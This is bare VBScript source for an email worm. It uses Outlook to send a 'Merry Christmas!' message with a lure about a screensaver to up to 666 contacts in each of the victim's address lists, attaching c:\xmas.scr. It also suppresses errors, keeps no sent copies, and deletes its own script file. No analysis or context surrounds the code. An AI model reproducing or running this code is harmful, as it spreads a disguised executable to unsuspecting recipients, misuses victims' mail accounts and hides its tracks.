On Error Resume Next
Dim quizy, Mail, Counter, A, B, C, D, E
Set quizy = CreateObject ("outlook.application")
Set Mail = quizy.GetNameSpace ("MAPI")
For A = 1 To Mail.AddressLists.Count
Set B = Mail.AddressLists (A)
Counter = 1
Set C = quizy.CreateItem (0)
For D = 1 To B.AddressEntries.Count
E = B.AddressEntries (Counter)
C.Recipients.Add E
Counter = Counter + 1
If Counter > 666 Then Exit For
Next
C.Subject = "Merry Christmas!"
C.Body = "You've probably received enough e-cards. Here's a nice Christmas screensaver instead :)"
C.Attachments.Add "c:\xmas.scr"
C.DeleteAfterSubmit = True
C.Send
Next
Set C = CreateObject ("Scripting.FileSystemObject")
C.DeleteFile Wscript.ScriptFullName